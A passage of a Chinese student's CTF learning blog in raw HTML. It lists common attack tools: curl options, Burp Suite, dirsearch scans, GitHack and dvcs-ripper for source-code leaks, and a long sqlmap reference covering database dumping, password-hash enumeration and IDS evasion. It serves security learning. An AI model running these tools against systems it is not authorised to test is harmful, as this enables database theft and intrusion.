    <content type="html"><![CDATA[<h2 id="CTFHub-技能树学习记录">CTFHub 技能树学习记录</h2><p>自从选了信息安全这个专业后，本人想要通过CTF 来接触信息安全方面的实战知识，因此接触到了 CTFHub，由此 blog 记录我的技能树点亮学习记录。</p><blockquote><p>因为笔者也是边学边写的，大多理解都是我当时探索出来的</p><p>为了保证知识量的充分，可能会忽略排版</p><p>不保证完全正确，如有错误，欢迎指正，谢谢</p></blockquote><p>技能树分布</p><p>（1）Web</p><p>（1.1）Web进阶</p><p>（2）Pwn</p><p>（3）Reverse</p><p>（4）Crypto</p><p>（5）Misc</p><p>（6）彩蛋</p><p>（7）BlockChain</p><h3 id="常用命令和工具">常用命令和工具</h3><p>这里先给出解题比较常用的命令和工具（当然每题的解法多种多样，本人小白一个，我会尽力去找更多的解法的，如有不全，请多包涵）</p><blockquote><p>提醒一下有些文件会报毒，我是全部都放在虚拟机里面</p><p>因为这里要用的工具我都自己有，需要的评论就行</p></blockquote><h4 id="1-curl">1.curl</h4><p>详情请点击<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">这里</a></p><h5 id="简单的命令集合">简单的命令集合</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">-a/--append 上传文件时，附加到目标文件  </span><br><span class="line"> -A/--user-agent &lt;string&gt; 设置用户代理发送给服务器  </span><br><span class="line"> --anyauth 可以使用“任何”身份验证方法  </span><br><span class="line"> -b/--cookie &lt;name=string/file&gt; cookie 字符串或文件读取位置  </span><br><span class="line"> --basic 使用 HTTP 基本验证  </span><br><span class="line"> -B/--use-ascii 使用 ASCII /文本传输  </span><br><span class="line"> -c/--cookie-jar &lt;file&gt; 操作结束后把 cookie 写入到这个文件中  </span><br><span class="line"> -C/--continue-at &lt;offset&gt; 断点续转  </span><br><span class="line"> -d/--data &lt;data&gt; HTTP POST 方式传送数据  </span><br><span class="line"> --data-ascii &lt;data&gt; 以 ascii 的方式 post 数据  </span><br><span class="line"> --data-binary &lt;data&gt; 以二进制的方式 post 数据  </span><br><span class="line"> --negotiate 使用 HTTP 身份验证  </span><br><span class="line"> --digest 使用数字身份验证  </span><br><span class="line"> --disable-eprt 禁止使用 EPRT 或 LPRT  </span><br><span class="line"> --disable-epsv 禁止使用 EPSV  </span><br><span class="line"> -D/--dump-header &lt;file&gt; 把 header 信息写入到该文件中  </span><br><span class="line"> --egd-file &lt;file&gt; 为随机数据(SSL)设置 EGD socket 路径  </span><br><span class="line"> --tcp-nodelay 使用 TCP_NODELAY 选项  </span><br><span class="line"> -e/--referer 来源网址  </span><br><span class="line"> -E/--cert &lt;cert[:passwd]&gt; 客户端证书文件和密码 (SSL)  </span><br><span class="line"> --cert-type &lt;type&gt; 证书文件类型 (DER/PEM/ENG) (SSL)  </span><br><span class="line"> --key &lt;key&gt; 私钥文件名 (SSL)  </span><br><span class="line"> --key-type &lt;type&gt; 私钥文件类型 (DER/PEM/ENG) (SSL)  </span><br><span class="line"> --pass &lt;pass&gt; 私钥密码 (SSL)  </span><br><span class="line"> --engine &lt;eng&gt; 加密引擎使用 (SSL). &quot;--engine list&quot; for list  </span><br><span class="line"> --cacert &lt;file&gt; CA 证书 (SSL)  </span><br><span class="line"> --capath &lt;directory&gt; CA 目录 (made using c_rehash) to verify peer against (SSL)  </span><br><span class="line"> --ciphers &lt;list&gt; SSL 密码  </span><br><span class="line"> --compressed 要求返回是压缩的形势 (using deflate or gzip)  </span><br><span class="line"> --connect-timeout &lt;seconds&gt; 设置最大请求时间  </span><br><span class="line"> --create-dirs 建立本地目录的目录层次结构  </span><br><span class="line"> --crlf 上传是把 LF 转变成 CRLF  </span><br><span class="line"> -f/--fail 连接失败时不显示 http 错误  </span><br><span class="line"> --ftp-create-dirs 如果远程目录不存在，创建远程目录  </span><br><span class="line"> --ftp-method [multicwd/nocwd/singlecwd] 控制 CWD 的使用  </span><br><span class="line"> --ftp-pasv 使用 PASV/EPSV 代替端口  </span><br><span class="line"> --ftp-skip-pasv-ip 使用 PASV 的时候,忽略该 IP 地址  </span><br><span class="line"> --ftp-ssl 尝试用 SSL/TLS 来进行 ftp 数据传输  </span><br><span class="line"> --ftp-ssl-reqd 要求用 SSL/TLS 来进行 ftp 数据传输  </span><br><span class="line"> -F/--form &lt;name=content&gt; 模拟 http 表单提交数据  </span><br><span class="line"> -form-string &lt;name=string&gt; 模拟 http 表单提交数据  </span><br><span class="line"> -g/--globoff 禁用网址序列和范围使用&#123;&#125;和[]  </span><br><span class="line"> -G/--get 以 get 的方式来发送数据  </span><br><span class="line"> -h/--help 帮助  </span><br><span class="line"> -H/--header &lt;line&gt;自定义头信息传递给服务器  </span><br><span class="line"> --ignore-content-length 忽略的 HTTP 头信息的长度  </span><br><span class="line"> -i/--include 输出时包括 protocol 头信息  </span><br><span class="line"> -I/--head 只显示文档信息</span><br><span class="line">-j/--junk-session-cookies 读取文件进忽略 session cookie  </span><br><span class="line"> --interface &lt;interface&gt; 使用指定网络接口/地址  </span><br><span class="line"> --krb4 &lt;level&gt; 使用指定安全级别的 krb4  </span><br><span class="line"> -k/--insecure 允许不使用证书到 SSL 站点  </span><br><span class="line"> -K/--config 指定的配置文件读取  </span><br><span class="line"> -l/--list-only 列出 ftp 目录下的文件名称  </span><br><span class="line"> --limit-rate &lt;rate&gt; 设置传输速度  </span><br><span class="line"> --local-port&lt;NUM&gt; 强制使用本地端口号  </span><br><span class="line"> -m/--max-time &lt;seconds&gt; 设置最大传输时间  </span><br><span class="line"> --max-redirs &lt;num&gt; 设置最大读取的目录数  </span><br><span class="line"> --max-filesize &lt;bytes&gt; 设置最大下载的文件总量  </span><br><span class="line"> -M/--manual 显示全手动  </span><br><span class="line"> -n/--netrc 从 netrc 文件中读取用户名和密码  </span><br><span class="line"> --netrc-optional 使用 .netrc 或者 URL 来覆盖-n  </span><br><span class="line"> --ntlm 使用 HTTP NTLM 身份验证  </span><br><span class="line"> -N/--no-buffer 禁用缓冲输出  </span><br><span class="line"> -o/--output 把输出写到该文件中  </span><br><span class="line"> -O/--remote-name 把输出写到该文件中，保留远程文件的文件名  </span><br><span class="line"> -p/--proxytunnel 使用 HTTP 代理  </span><br><span class="line"> --proxy-anyauth 选择任一代理身份验证方法  </span><br><span class="line"> --proxy-basic 在代理上使用基本身份验证  </span><br><span class="line"> --proxy-digest 在代理上使用数字身份验证  </span><br><span class="line"> --proxy-ntlm 在代理上使用 ntlm 身份验证  </span><br><span class="line"> -P/--ftp-port &lt;address&gt; 使用端口地址，而不是使用 PASV  </span><br><span class="line"> -Q/--quote &lt;cmd&gt;文件传输前，发送命令到服务器  </span><br><span class="line"> -r/--range &lt;range&gt;检索来自 HTTP/1.1 或 FTP 服务器字节范围  </span><br><span class="line"> --range-file 读取（SSL）的随机文件  </span><br><span class="line"> -R/--remote-time 在本地生成文件时，保留远程文件时间  </span><br><span class="line"> --retry &lt;num&gt; 传输出现问题时，重试的次数  </span><br><span class="line"> --retry-delay &lt;seconds&gt; 传输出现问题时，设置重试间隔时间  </span><br><span class="line"> --retry-max-time &lt;seconds&gt; 传输出现问题时，设置最大重试时间  </span><br><span class="line"> -s/--silent 静音模式。不输出任何东西  </span><br><span class="line"> -S/--show-error 显示错误  </span><br><span class="line"> --socks4 &lt;host[:port]&gt; 用 socks4 代理给定主机和端口  </span><br><span class="line"> --socks5 &lt;host[:port]&gt; 用 socks5 代理给定主机和端口  </span><br><span class="line"> --stderr &lt;file&gt;  </span><br><span class="line"> -t/--telnet-option &lt;OPT=val&gt; Telnet 选项设置  </span><br><span class="line"> --trace &lt;file&gt; 对指定文件进行 debug  </span><br><span class="line"> --trace-ascii &lt;file&gt; Like --跟踪但没有 hex 输出  </span><br><span class="line"> --trace-time 跟踪/详细输出时，添加时间戳  </span><br><span class="line"> -T/--upload-file &lt;file&gt; 上传文件  </span><br><span class="line"> --url &lt;URL&gt; Spet URL to work with  </span><br><span class="line"> -u/--user &lt;user[:password]&gt;设置服务器的用户和密码  </span><br><span class="line"> -U/--proxy-user &lt;user[:password]&gt;设置代理用户名和密码  </span><br><span class="line"> -v/--verbose  </span><br><span class="line"> -V/--version 显示版本信息  </span><br><span class="line"> -w/--write-out [format]什么输出完成后  </span><br><span class="line"> -x/--proxy &lt;host[:port]&gt;在给定的端口上使用 HTTP 代理  </span><br><span class="line"> -X/--request &lt;command&gt;指定什么命令  </span><br><span class="line"> -y/--speed-time 放弃限速所要的时间。默认为 30  </span><br><span class="line"> -Y/--speed-limit 停止传输速度的限制，速度时间&#x27;秒  </span><br><span class="line"> -z/--time-cond 传送时间设置  </span><br><span class="line"> -0/--http1.0 使用 HTTP 1.0  </span><br><span class="line"> -1/--tlsv1 使用 TLSv1（SSL）  </span><br><span class="line"> -2/--sslv2 使用 SSLv2 的（SSL）  </span><br><span class="line"> -3/--sslv3 使用的 SSLv3（SSL）  </span><br><span class="line"> --3p-quote like -Q for the source URL for 3rd party transfer  </span><br><span class="line"> --3p-url 使用 url，进行第三方传送  </span><br><span class="line"> --3p-user 使用用户名和密码，进行第三方传送  </span><br><span class="line"> -4/--ipv4 使用 IP4  </span><br><span class="line"> -6/--ipv6 使用 IP6  </span><br><span class="line"><span class="meta prompt_"> -#</span><span class="language-bash">/--progress-bar 用进度条显示当前的传送状态</span></span><br><span class="line">————</span><br><span class="line">后置：</span><br><span class="line">-v 显示详细信息（verbose 缩写），包括 IP 解析过程</span><br><span class="line">-i 显示头信息</span><br><span class="line">-I 只显示头信息</span><br></pre></td></tr></table></figure><h4 id="2-burp">2.burp</h4><p>这个很有用，集渗透，爆破等等一系列模块的软件，这里不多介绍，有兴趣可以去看国人写的介绍 👉<a href="https://t0data.gitbooks.io/burpsuite/content/">Burp Suite 实战指南</a></p><blockquote><p>软件没有的话懒得去找可以留言找我，burp 实战指南 pdf 版我也有</p></blockquote><h4 id="3-浏览器-f12-自带的开发者模式">3.浏览器 f12 自带的开发者模式</h4><p>有关在客户端方面的很多都用开发者模式解决</p><h4 id="4-dirsearch">4.dirsearch</h4><p>dirsearch 是一个基于 python 的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件，用于探测 WEB 服务器下的<strong>敏感文件/目录</strong>的命令行工具。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常用命令</span><br><span class="line">python dirsearch.py -u http://xxxx //日常使用</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r //递归扫描，不过容易被检测</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 //线程控制请求速率</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080 //使用代理</span><br></pre></td></tr></table></figure><p>下载教程及说明 👉<a href="https://www.nonevector.top/posts/18.html">点击直达</a></p><p>ps:网上一大坨教程我找了好久才找到有用的 😭</p><h4 id="5-GitHack">5.GitHack</h4><p>GitHack is a .git folder disclosure exploit.</p><p>It rebuild source code from .git folder while keep directory structure unchanged.</p><p>GitHack 是一个.git 泄露利用脚本，通过泄露的.git 文件夹下的文件，重建还原工程源代码。</p><p>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL 注射等 web 安全漏洞。<br>下载需要使用 git 命令</p><p><a href="https://zhuanlan.zhihu.com/p/242540359">windows 下载 git</a></p><p>linux 系统下载 git 使用命令行<code>yum install git</code></p><p>然后在自己想要的文件位置使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure><p>值得一提的是 GitHack 只能在 Python2 的环境下运行</p><h4 id="6-dvcs-ripper">6.dvcs-ripper</h4><p>泄露漏洞利用工具，在 linux 里面使用（可以找.svn，.hg 等等）</p><p>使用 git 下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>然后使用命令下载需要组件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>即可</p><h4 id="7-password">7.password</h4><p>字典需要准备好，用于爆破、</p><h4 id="8-sqlmap">8.sqlmap</h4><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程</a></p><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p><h5 id="1-命令">1.命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line">sqlmap常用命令</span><br><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                         显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">                                              0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">                                              1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">                                              2：显示debug消息</span><br><span class="line"></span><br><span class="line">                                              3：显示注入payload</span><br><span class="line"></span><br><span class="line">                                              4：显示http请求</span><br><span class="line"></span><br><span class="line">                                              5：显示http响应头·</span><br><span class="line"></span><br><span class="line">                                              6：显示http响应内容</span><br><span class="line"></span><br><span class="line">Target：                                </span><br><span class="line"></span><br><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br><span class="line"></span><br><span class="line">Request</span><br><span class="line"></span><br><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                           POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br><span class="line"></span><br><span class="line">Optimization</span><br><span class="line"></span><br><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br><span class="line"></span><br><span class="line">Injection</span><br><span class="line"></span><br><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br><span class="line"></span><br><span class="line">Detectiong</span><br><span class="line"></span><br><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br><span class="line"></span><br><span class="line">Techniques</span><br><span class="line"></span><br><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint</span><br><span class="line"></span><br><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br><span class="line"></span><br><span class="line">Emuneration</span><br><span class="line"></span><br><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br><span class="line"></span><br><span class="line">Brute force</span><br><span class="line"></span><br><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br><span class="line"></span><br><span class="line">File system 